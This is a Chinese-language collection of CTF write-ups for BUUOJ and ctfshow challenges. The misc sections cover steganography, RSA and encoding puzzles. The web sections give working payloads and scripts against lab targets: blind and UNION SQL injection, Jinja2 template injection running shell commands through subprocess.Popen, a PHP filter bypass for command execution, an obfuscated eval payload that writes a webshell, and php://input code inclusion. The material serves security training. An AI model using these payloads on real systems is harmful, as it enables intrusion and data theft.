## [BSidesCF 2019]Kookie
根据提示,修改cookie
```
monster:admin
```
![image](https://user-images.githubusercontent.com/81904597/115979059-3793dc00-a5b6-11eb-810f-e0a50bd9f6f4.png)

得到回显 set-cookie:设置username
```
monster:admin;username:admin
```
![image](https://user-images.githubusercontent.com/81904597/115979070-44183480-a5b6-11eb-85e1-2aa1baea061b.png)
## [极客大挑战 2019]RCE ME
题目源码
```
<?php

putenv('PATH=/home/rceservice/jail');

if (isset($_REQUEST['cmd'])) {
    $json = $_REQUEST['cmd'];

    if (!is_string($json)) {
        echo 'Hacking attempt detected<br/><br/>';
    } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
        echo 'Hacking attempt detected<br/><br/>';
    } else {
        echo 'Attempting to run command:<br/>';
        $cmd = json_decode($json, true)['cmd'];
        if ($cmd !== NULL) {
            system($cmd);
        } else {
            echo 'Invalid input';
        }
        echo '<br/><br/>';
    }
}

?>
```
```
?cmd=%0a{"cmd":"/bin/cat /home/rceservice/flag"%0a}
```
https://blog.csdn.net/rfrder/article/details/110573955

## [WUSTCTF2020]颜值成绩查询
过滤了空格的盲注，这里直接贴payload
```
import requests

url = 'http://f4efb6bb-bd98-43f6-b5f0-33f3dac0e142.node3.buuoj.cn/?stunum='

flag=''
for i in range(1,50):
    min=32
    max=125
    while 1:
        j=min+(max-min)//2
        if min==j:
            flag+=chr(j)
            print(flag)
            break

        payload="if(ascii(substr((select/**/value/**/from/**/flag),%d,1))<%d,1,2)"%(i,j)

        r=requests.get(url=url+payload).text
        #print(r)

        if 'your score is: 100' in r:
            max=j
        else :
            min=j
```
## [CSCCTF 2019 Qual]FlaskLight
查看源代码提示 search get传参
![image](https://user-images.githubusercontent.com/81904597/115979184-0ec01680-a5b7-11eb-86a2-e0787dd7b43c.png)
然后我们准备寻找os类
```
{{[].__class__.__base__.__subclasses__()}}
```
无奈找不到,然后看一眼wp，需要找存在Popen的类来执行命令
#查找可以利用的类 利用subprocess.Popen执行命令
```
import requests
import re
import html
import time

index = 0
for i in range(170, 1000):
    try:
        url = "http://878e7c4d-d15f-432c-bcb4-d327685a1f55.node3.buuoj.cn/?search={{''.__class__.__mro__[2].__subclasses__()[" + str(i) + "]}}"
        r = requests.get(url)
        res = re.findall("<h2>You searched for:<\/h2>\W+<h3>(.*)<\/h3>", r.text)
        time.sleep(0.1)
        # print(res)
        # print(r.text)
        res = html.unescape(res[0])
        print(str(i) + " | " + res)
        if "subprocess.Popen" in res:
            index = i
            break
    except:
        continue
print("indexo of subprocess.Popen:" + str(index))
```
贴一个查找类的通用脚本
```
import requests
import html
import time

for i in range(0,300):
    time.sleep(0.06)
    url='http://878e7c4d-d15f-432c-bcb4-d327685a1f55.node3.buuoj.cn/?search={{\'\'.__class__.__mro__[2].__subclasses__()[%d]}}' %(i)
    r = requests.get(url)
    print(url)
    if "subprocess.Popen" in html.unescape(r.text):
        print(i)
        break
```
```
?search={{''.__class__.__mro__[2].__subclasses__()[258]('cat /flasklight/coomme_geeeett_youur_flek',shell=True,stdout=-1).communicate()[0].strip()}}
```
## [极客大挑战 2019]RCE ME
一开始给了源码
```
<?php
error_reporting(0);
if(isset($_GET['code'])){
            $code=$_GET['code'];
                    if(strlen($code)>40){
                                        die("This is too Long.");
                                                }
                    if(preg_match("/[A-Za-z0-9]+/",$code)){
                                        die("NO.");
                                                }
                    @eval($code);
}
else{
            highlight_file(__FILE__);
}
// ?>
```
明显的无数字字母rce，但是长度要在40以内
所以只能使用取反
先尝试执行phpinfo()
```
(~%8F%97%8F%96%91%99%90)();
```
![image](https://user-images.githubusercontent.com/81904597/115979236-56df3900-a5b7-11eb-9ad3-42ea1015211c.png)

禁用了一堆命令执行的函数,但是可以写木马
(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6);
能连shell但是执行不了命令
使用插件bypass(心酸)
![image](https://user-images.githubusercontent.com/81904597/115979252-68284580-a5b7-11eb-802a-6f9a816ccaec.png)
![image](https://user-images.githubusercontent.com/81904597/115979256-70808080-a5b7-11eb-8c51-9b25deb4dba1.png)
## [Zer0pts2020]Can you guess it?
```
<?php
include 'config.php'; // FLAG is defined in config.php
if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
  exit("I don't know what you are thinking, but I won't let you read it :)");
}
if (isset($_GET['source'])) {
  highlight_file(basename($_SERVER['PHP_SELF']));
  exit();
}
$secret = bin2hex(random_bytes(64));
if (isset($_POST['guess'])) {
  $guess = (string) $_POST['guess'];
  if (hash_equals($secret, $guess)) {
    $message = 'Congratulations! The flag is: ' . FLAG;
  } else {
    $message = 'Wrong.';
  }
}
?>
```
```
/index.php/config.php/%80?source

```



## [WUSTCTF2020]spaceclub
```
考察点:二进制转字符串
```
## [XMAN2018排位赛]通行证
```
考察点:base64-》凯撒->栅栏
```
##[WUSTCTF2020]爬
```
考察点:PDF隐写,hextostring
```
## [WUSTCTF2020]girlfriend
![image](https://user-images.githubusercontent.com/81904597/115979402-4f6c5f80-a5b8-11eb-8ca4-4ce685715110.png)

```
999     --->   y
666     --->   o
88      --->   u
2       --->   a
777     --->   r
33      --->   e
6       --->   m
999     --->   y
4       --->   g
4444    --->   i
777     --->   r
555     --->   l
333     --->   f
777     --->   r
444     --->   i
33      --->   e
66      --->   n
3       --->   d
7777    --->   s
```
## 二维码
考察点:ps
![image](https://user-images.githubusercontent.com/81904597/115979414-60b56c00-a5b8-11eb-825f-eaec7ce6f7c2.png)

## [GUET-CTF2019]虚假的压缩包
考察点:伪加密,rsa,脑洞,docx隐写
解伪加密之后给了n 和 e
```
import gmpy2
p = 3
q = 11
e = 0x3
c = 26
n = 33
s = (p- 1) * (q - 1)
d = gmpy2.invert(e,s)
m = pow(c,d,n)
print pow(c, d, n)
```
得到密码是5(rsa得到5,脑洞中文密码，密码是5)
得到
![image](https://user-images.githubusercontent.com/81904597/115979422-72970f00-a5b8-11eb-9cce-1cf14bc56a9c.png)
```
original = open("亦真亦假",'r').read()
flag = open("flag",'w')
for i in original:
    tmp = int(i,16)^5
    flag.write(hex(tmp)[2:])
```
zip转docx，改变字体颜色
![image](https://user-images.githubusercontent.com/81904597/115979449-8c385680-a5b8-11eb-8dcb-74bb2924956e.png)

## [SWPU2019]Network
```
import binascii
with open('attachment.txt','r') as fp:
    a=fp.readlines()
    p=[]
    for x in range(len(a)):
       p.append(int(a[x])) 
    s=''
    for i in p:
        if(i==63):
            b='00'
        elif(i==127):
            b='01'
        elif(i==191):
            b='10'
        else:
            b='11'
        s +=b
# print(s)
flag = ''
for i in range(0,len(s),8):
    flag += chr(int(s[i:i+8],2))
flag = binascii.unhexlify(flag)
wp = open('ans.zip','wb')
wp.write(flag)
wp.close()


# -*- encoding: utf-8 -*-
import base64

f = open('flag.txt','rb').read()
while True:
    f = base64.b64decode(f)
    if b'{' in f:
        print(f)
        break
    else:
        continue
```

## [UTCTF2020]docx
```
考察点:docx->zip
在media里有flag的图片
```
## [UTCTF2020]file header
```
修改png文件头
```
## [*CTF2019]otaku
 ![image](https://user-images.githubusercontent.com/81904597/115979491-c1dd3f80-a5b8-11eb-85b3-c81b187d623e.png)

docx里隐藏下图文字，flag.zip为伪加密，看到flag.zip里的内容，想到用隐藏的文字进行明文攻击。
![image](https://user-images.githubusercontent.com/81904597/115979498-cd306b00-a5b8-11eb-96fd-56445d1de1ac.png)

但是无奈，压缩后CRC的值不同，哭哭。
明文攻击得到密钥，得到一张png图片 zsteg分析拿到flag
![image](https://user-images.githubusercontent.com/81904597/115979500-d4577900-a5b8-11eb-92b4-b304bf3b8f06.png)
## 真的很杂
binwalk-e分离得到一堆不知道啥玩意
![image](https://user-images.githubusercontent.com/81904597/115979509-df120e00-a5b8-11eb-90b8-40ad24b57bd7.png)

## [ACTF新生赛2020]剑龙
考察点:颜文字，steghide，pyc隐写
```
python3 stegosaurus.py -x O_O.pyc
```
![image](https://user-images.githubusercontent.com/81904597/115979523-f2bd7480-a5b8-11eb-85a6-c1d819a34081.png)

## [QCTF2018]X-man-A face
考察点:ps补全，base32

## [MRCTF2020]pyFlag
每张图片的末尾有，部分zip的内容，合并之后得到一个完整的zip
![image](https://user-images.githubusercontent.com/81904597/115979533-023cbd80-a5b9-11eb-83bc-365351ad1d1a.png)
爆破一下得到密码
利用hint破解flag.txt里的内容
```
#!/usr/bin/env python

import base64
import re

def baseDec(text,type):
    if type == 1:
        return base64.b16decode(text)
    elif type == 2:
        return base64.b32decode(text)
    elif type == 3:
        return base64.b64decode(text)
    elif type == 4:
        return base64.b85decode(text)
    else:
        pass

def detect(text):
    try:
        if re.match("^[0-9A-F=]+$",text.decode()) is not None:
            return 1
    except:
        pass
    
    try:
        if re.match("^[A-Z2-7=]+$",text.decode()) is not None:
            return 2
    except:
        pass

    try:
        if re.match("^[A-Za-z0-9+/=]+$",text.decode()) is not None:
            return 3
    except:
        pass
    
    return 4

def autoDec(text):
    while True:
        if b"MRCTF{" in text:
            print("\n"+text.decode())
            break

        code = detect(text)
        text = baseDec(text,code)

with open("flag.txt",'rb') as f:
    flag = f.read()

autoDec(flag)
```
## Business Planning Group
png藏了一张bpg图片，查看bpg得到base64
![image](https://user-images.githubusercontent.com/81904597/115979541-17b1e780-a5b9-11eb-9427-24db8c335a60.png)

解码拿到flag
## [GWCTF2019]huyao
考察点:频域盲水印
两张相同的png图片，考虑为盲水印或者是频域盲水印,尝试后是频域盲水印
```
import cv2
import numpy as np
import random
import os
from argparse import ArgumentParser

ALPHA = 5

def build_parser():
    parser = ArgumentParser()
    parser.add_argument('--original', dest='ori', required=True)
    parser.add_argument('--image', dest='img', required=True)
    parser.add_argument('--result', dest='res', required=True)
    parser.add_argument('--alpha', dest='alpha', default=ALPHA)
    return parser

def main():
    parser = build_parser()
    options = parser.parse_args()
    ori = options.ori
    img = options.img
    res = options.res
    alpha = options.alpha
    if not os.path.isfile(ori):
        parser.error("original image %s does not exist." % ori)
    if not os.path.isfile(img):
        parser.error("image %s does not exist." % img)
    decode(ori, img, res, alpha)

def decode(ori_path, img_path, res_path, alpha):
    ori = cv2.imread(ori_path)
    img = cv2.imread(img_path)
    ori_f = np.fft.fft2(ori)
    img_f = np.fft.fft2(img)
    height, width = ori.shape[0], ori.shape[1]
    watermark = (ori_f - img_f) / alpha
    watermark = np.real(watermark)
    res = np.zeros(watermark.shape)
    random.seed(height + width)
    x = range(height / 2)
    y = range(width)
    random.shuffle(x)
    random.shuffle(y)
    for i in range(height / 2):
        for j in range(width):
            res[x[i]][y[j]] = watermark[i][j]
    cv2.imwrite(res_path, res, [int(cv2.IMWRITE_JPEG_QUALITY), 100])

if __name__ == '__main__':
    main()
```
```
python2 1.py --original 1.png --image 2.png --result out.png
```
![image](https://user-images.githubusercontent.com/81904597/115979552-28faf400-a5b9-11eb-8885-fb78da591e49.png)

cv2库安装
```
python2 -m pip install  opencv-python==4.2.0.32
```



## [UTCTF2020]File Carving
考察点:elf文件是linux下的可执行文件

png分离出一个压缩包，压缩包里存了一个elf文件，放在linux下执行即可
![image](https://user-images.githubusercontent.com/81904597/115979565-387a3d00-a5b9-11eb-9133-16cb07792a57.png)


## [GUET-CTF2019]soul sipse
![image](https://user-images.githubusercontent.com/81904597/115979573-4203a500-a5b9-11eb-835d-734d03ab20e0.png)


steghide extract -sf out.wav 
![image](https://user-images.githubusercontent.com/81904597/115979577-48921c80-a5b9-11eb-9249-c865c56693e4.png)

下载一张图片，文件头错误，修改文件头
![image](https://user-images.githubusercontent.com/81904597/115979581-521b8480-a5b9-11eb-9782-a3c59f39ec08.png)
```
\u0034\u0030\u0037\u0030\u000d\u000a\u0031\lu0032\u0033\u0034\u000d\u000a
```
![image](https://user-images.githubusercontent.com/81904597/115979589-5f387380-a5b9-11eb-8071-49ac822aa07d.png)

flag{5304}
## [UTCTF2020]spectogram

直接看频谱图
![image](https://user-images.githubusercontent.com/81904597/115979602-6e1f2600-a5b9-11eb-83b1-60b504762339.png)
flag{sp3tr0gr4m0ph0n3}
## [watevrCTF 2019]Evil Cuteness
png分离出一个压缩包，压缩包的文件打开就是flag
![image](https://user-images.githubusercontent.com/81904597/115979610-77a88e00-a5b9-11eb-8626-2a3c1cf4939b.png)


## ctfshow web签到

![image](https://user-images.githubusercontent.com/81904597/115979616-8000c900-a5b9-11eb-84b5-76bc7de52263.png)

查看源代码解base64得到flag

## web2
![image](https://user-images.githubusercontent.com/81904597/115979624-8a22c780-a5b9-11eb-832b-3ee8387d62a8.png)
```
username=admin%27union select 1,group_concat(flag),3 from flag#&password=13
```
## web3

web3
![image](https://user-images.githubusercontent.com/81904597/115979634-9e66c480-a5b9-11eb-8889-08f17c2df211.png)

get:?url=php://input
post:<?php system("ls");?>
![image](https://user-images.githubusercontent.com/81904597/115979641-a6266900-a5b9-11eb-929f-10b1ca2f48d1.png)


## web4
![image](https://user-images.githubusercontent.com/81904597/115979650-b3435800-a5b9-11eb-885b-16beec8e30fb.png)



